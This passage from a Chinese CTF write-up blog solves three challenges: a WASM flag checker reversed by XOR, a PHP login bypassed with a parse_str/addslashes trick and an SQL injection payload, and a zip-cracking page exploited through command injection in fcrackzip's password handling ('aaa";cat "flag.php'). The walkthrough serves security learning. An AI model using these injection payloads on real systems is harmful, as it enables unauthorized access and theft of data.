<span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_memory) = (&amp;w2c_memory);</span><br><span class="line">  <span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_get_bufZ_iv) = (&amp;w2c_get_buf);</span><br><span class="line">  <span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_check_flagZ_ii) = (&amp;w2c_check_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  init_func_types();</span><br><span class="line">  init_globals();</span><br><span class="line">  init_memory();</span><br><span class="line">  init_table();</span><br><span class="line">  init_exports();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反编译出来的C源码还是很复杂，可以将其再次编译成可执行文件，用IDA打开反编译进行静态分析。再次编译需要使用“wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h”这三个文件，可以在wasm2c的位置下找到。</p>
<p>由于在前端源码里主要调用了check_flag函数去检查flag，所以直接看check_flag函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">w2c_check_flag</span><span class="params">(<span class="keyword">int</span> buf_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> f; <span class="comment">// ST24_1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7L</span>L);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    f = i32_load8_u(&amp;w2c_memory, i + buf_addr);  <span class="comment">// 取出flag里第i个字符</span></span><br><span class="line">    result |= (i32_load8_u(&amp;w2c_memory, i++ + <span class="number">16</span>) ^ f) ^ <span class="number">0x42</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i != <span class="number">23</span> );</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> result == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的buf_addr是在前端中调用了get_buf函数获取的，该函数直接返回了80</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">w2c_get_buf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7L</span>L);</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">80L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后需要result为0，根据同或的性质，result在循环中每次迭代时都需要为0，最后的结果才能使0，所以表达式<code>(i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f) ^ 0x42;</code>将恒为0。</p>
<p>根据异或的性质，则表达式<code>i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f</code>将恒为0x42。</p>
<p>根据异或的交换律<code>f = i32_load8_u(&amp;w2c_memory, i + 16) ^ 0x42</code></p>
<p>flag位于从w2c_memory第16位开始，长度为23，这里的w2c_memory在init_memory函数中初始化，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_memory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  wasm_rt_allocate_memory(&amp;w2c_memory, <span class="number">1L</span>L, <span class="number">0x10000</span>LL);</span><br><span class="line">  v0 = w2c_memory + <span class="number">16</span>;</span><br><span class="line">  *v0 = data_segment_data_0;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="number">0x3131032027152D2E</span>LL;</span><br><span class="line">  *(v0 + <span class="number">16</span>) = <span class="number">0x2E202F27</span>;</span><br><span class="line">  *(v0 + <span class="number">20</span>) = <span class="number">0x3F3B</span>;</span><br><span class="line">  *(v0 + <span class="number">22</span>) = <span class="number">0x42</span>;</span><br><span class="line">  v1 = w2c_memory + <span class="number">48</span>;</span><br><span class="line">  *v1 = data_segment_data_1;</span><br><span class="line">  *(v1 + <span class="number">8</span>) = <span class="number">0x46734967616C4673</span>LL;</span><br><span class="line">  *(v1 + <span class="number">16</span>) = <span class="number">0x7D656B61</span>;</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  *(v1 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>w2c_memory第16为开始被赋值为data_segment_data_0，data_segment_data_0的定义为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>但是从data_segment_data_0的第8位开始又被赋予了新值，纠正后的结果为[0x24, 0x2e, 0x23, 0x25, 0x39, 0x0a, 0x27, 0x2e, 0x2e, 0x2d, 0x15, 0x27, 0x20, 0x03, 0x31, 0x31, 0x27, 0x2f, 0x20, 0x2e, 0x3b, 0x3f, 0x42]</p>
<p>最后得到flag<code>flag&#123;HelloWebAssembly&#125;</code></p>
<hr>
<h1 id="Confused-question-225"><a href="#Confused-question-225" class="headerlink" title="Confused question(225)"></a>Confused question(225)</h1><p>直接看前端源码给了两个hint</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--register.php?username=xxx will reg a new user for you with password &#x27;123&#x27;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--login.php.txt--&gt;</span></span><br></pre></td></tr></table></figure>

<p>先看login.php.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashesForEvery</span>(<span class="params">$array</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!is_array($array))&#123;<span class="keyword">return</span> addslashes($array);&#125;</span><br><span class="line">	<span class="keyword">foreach</span>($array <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">		$array[$key] = addslashes($val);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line">$loginStr = $_GET[<span class="string">&#x27;loginstr&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;admin&#x27;</span>]))&#123;$loginStr = str_ireplace(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>,$loginStr);&#125;</span><br><span class="line">parse_str($loginStr,$loginStr);</span><br><span class="line"><span class="keyword">foreach</span>($loginStr <span class="keyword">as</span> $n =&gt; $v)&#123;</span><br><span class="line">	$v = addslashesForEvery($v);</span><br><span class="line">	<span class="keyword">if</span>($n === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		$username = $v[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		$password = addslashesForEvery($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">		$sql = <span class="string">&quot;select * from admin where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">		$result = $DB-&gt;query($sql);</span><br><span class="line">		<span class="keyword">if</span>($result)&#123;$_SESSION[<span class="string">&#x27;adminlogin&#x27;</span>] = <span class="number">1</span>; <span class="keyword">echo</span> $flag;&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($n === <span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Hello Guest!But you cannot log in!&quot;</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了拿到flag需要n==admin，并且sql查询需要成功。首先str_ireplace将loginStr中的所有的admin都替换为guest，这里可以用GET数组绕过，例如<code>?loginstr[admin]=123</code>，parse_str无法处理数组，那么$logStr就为<code>[&#39;admin&#39;=&gt;&#39;123&#39;]</code>，满足n==admin。过了第一个条件以后就需要先办法让sql查询成功，由于没给注册，所以只能考虑sql注入。</p>
<p>使用GET数组虽然绕过了n==admin这个条件，但是v就不是一个数组了，只是一个字符串，这时如果把一个字符串当成数组取值的话php会将该字符串的第一个字符当作值取出，如果<code>?loginstr[admin]=&#39;</code>的话，addslashesForEvery将v过滤以后就变成了<code>\&#39;</code>，这时取出的第一个字符为反斜杠，带入sql语句就变成了<code>select * from admin where username = &#39;\&#39; and password = &#39;$password&#39;</code>，这里的反斜杠将username后的单引号转义，因此username就变成了<code>\&#39; and password = </code>，password就逃脱了单引号的限制，可以从password进行sql注入，最后的payload为<br>GET<code>?loginstr[admin]=&#39;</code>，POST<code>password=+ or 1#</code>，带入sql语句为<br><code>select * from admin where username = &#39;\&#39; and password = &#39; or 1#&#39;</code></p>
<p>最后拿到flag<code>flag&#123;pHP_H4s_s0_m4Ny_f3a7ur3s&#125;</code></p>
<hr>
<h1 id="ZipCracker-225"><a href="#ZipCracker-225" class="headerlink" title="ZipCracker(225)"></a>ZipCracker(225)</h1><p>题目说有源码泄露，先扫一下发现.index.php.swp文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf<span class="number">-8</span>&gt;</span><br><span class="line">&lt;title&gt;ZipCracker - Crack Your Zip Online&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/foundation/6.2.1/foundation.min.css&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/zipcracker.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">&lt;div class=&quot;top-bar&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;top-bar-title&quot;&gt;ZipCracker&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(max($_FILES[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;size&#x27;</span>], $_FILES[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]) &lt;= <span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">                <span class="comment">// Do you remember 430387 ?</span></span><br><span class="line">                $zip = $_FILES[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                $dict = $_FILES[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                $option = <span class="string">&quot;-D -p <span class="subst">$dict</span>&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;unzip&#x27;</span>])) &#123;</span><br><span class="line">                        $option = <span class="string">&quot;-u &quot;</span>.$option;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $cmd = <span class="string">&quot;timeout 3 ./fcrackzip-1.0/fcrackzip <span class="subst">$option</span> <span class="subst">$zip</span>&quot;</span>;</span><br><span class="line">                $res = shell_exec($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = <span class="string">&#x27;file is too large.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $res = <span class="string">&#x27;file is missing&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class=&quot;container-wrapper&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h1 class=&quot;container-head&quot;&gt;</span><br><span class="line">                        Crack Your ZIP Online</span><br><span class="line">                &lt;/h1&gt;</span><br><span class="line">                &lt;p class=&quot;container-subhead&quot;&gt;</span><br><span class="line">                        Only dictionary-based crack is available.&lt;br&gt;</span><br><span class="line">                        Both zip <span class="keyword">and</span> dictionary file must not exceed <span class="number">1</span>MB.</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">                &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                        &lt;label for=&quot;zip&quot; class=&quot;button&quot;&gt;ZIP file&lt;/label&gt;</span><br><span class="line">                        &lt;input id=&quot;zip&quot; type=&quot;file&quot; name=&quot;zip&quot; class=&quot;show-for-sr&quot;&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;label for=&quot;dict&quot; class=&quot;button&quot;&gt;Dictionary file&lt;/label&gt;</span><br><span class="line">                        &lt;input id=&quot;dict&quot; type=&quot;file&quot; name=&quot;dict&quot; class=&quot;show-for-sr&quot;&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;input id=<span class="string">&quot;unzip&quot;</span> type=<span class="string">&quot;checkbox&quot;</span> name=<span class="string">&quot;unzip&quot;</span>&gt;</span><br><span class="line">                        &lt;label <span class="keyword">for</span>=<span class="string">&quot;unzip&quot;</span>&gt;<span class="keyword">use</span> <span class="title">unzip</span>&lt;/<span class="title">label</span>&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">success</span> <span class="title">button</span>&quot;&gt;<span class="title">Crack</span>&lt;/<span class="title">button</span>&gt;</span><br><span class="line">                &lt;/<span class="title">form</span>&gt;</span><br><span class="line">                &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">res</span>?&gt;&lt;/<span class="title">p</span>&gt;</span><br><span class="line">        &lt;/<span class="title">div</span>&gt;</span><br><span class="line">&lt;/<span class="title">div</span>&gt;</span><br><span class="line">&lt;/<span class="title">div</span>&gt;</span><br><span class="line">&lt;/<span class="title">body</span>&gt;</span><br><span class="line">&lt;/<span class="title">html</span>&gt;</span><br></pre></td></tr></table></figure>

<p>最直观的有一个<code>shell_exec($cmd);</code>，但是这里cmd命令里面的所有可控输入都是文件的tmp_name，所以无法直接命令注入，但是这里使用了fcrackzip破解zip密码，而fcrackzip存在命令注入漏洞，当fcrackzip开启unzip选项时并且找到密码时，fcrackzip会直接使用该密码解压破解的zip文件，而fcrackzip正是直接使用了shell的unzip命令，将password带入命令行中没有做任何过滤，因此这里存在一个命令注入漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> REGPARAM <span class="title">check_unzip</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span> (buff, <span class="string">&quot;unzip -qqtP \&quot;%s\&quot; %s &quot;</span> DEVNULL, pw, file_path[<span class="number">0</span>]);</span><br><span class="line">    status = system (buff);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> REDIR</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status == EXIT_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nPASSWORD FOUND!!!!: pw == %s\n&quot;</span>, pw);</span><br><span class="line">        <span class="built_in">exit</span> (EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以可以给zip文件设置密码<code>aaa&quot;;cat &quot;flag.php</code>来执行命令拿到flag，提交的时候记得选择use unzip。得到flag为<code>flag&#123;bug_430387_cmd_injection&#125;</code></p>
<hr>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/BlueWhale/" rel="tag"># BlueWhale</a>
              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2019/09/25/V2Ray%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" rel="prev" title="V2Ray搭建记录">
      <i class="fa fa-chevron-left"></i> V2Ray搭建记录
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="AWDL协议及漏洞分析">
      AWDL协议及漏洞分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Welcome-to-web-5"><span class="nav-number">1.</span> <span class="nav-text">Welcome to web(5)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Calculator-25"><span class="nav-number">2.</span> <span class="nav-text">Calculator(25)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RapidTyping-50"><span class="nav-number">3.</span> <span class="nav-text">RapidTyping(50)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS1-75"><span class="nav-number">4.</span> <span class="nav-text">XSS1(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-2-75"><span class="nav-number">5.</span> <span class="nav-text">XSS 2(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-SQL-75"><span class="nav-number">6.</span> <span class="nav-text">Basic SQL(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-PHP-75"><span class="nav-number">7.</span> <span class="nav-text">Basic PHP(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-PHP-2-75"><span class="nav-number">8.</span> <span class="nav-text">Basic PHP 2(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabyXSS-100"><span class="nav-number">9.</span> <span class="nav-text">BabyXSS(100)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BasicFileInclude-150"><span class="nav-number">10.</span> <span class="nav-text">BasicFileInclude(150)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FxxkingBackdoor-175"><span class="nav-number">11.</span> <span class="nav-text">FxxkingBackdoor(175)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Global-Page-175"><span class="nav-number">12.</span> <span class="nav-text">Global Page(175)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabyCrack-200"><span class="nav-number">13.</span> <span class="nav-text">BabyCrack(200)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Baby-Reverse-200"><span class="nav-number">14.</span> <span class="nav-text">Baby Reverse(200)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Confused-question-225"><span class="nav-number">15.</span> <span class="nav-text">Confused question(225)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZipCracker-225"><span class="nav-number">16.</span> <span class="nav-text">ZipCracker(225)</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Srpopty</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Srpopty</span>
</div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'fb9b672afa74e328fbe8',
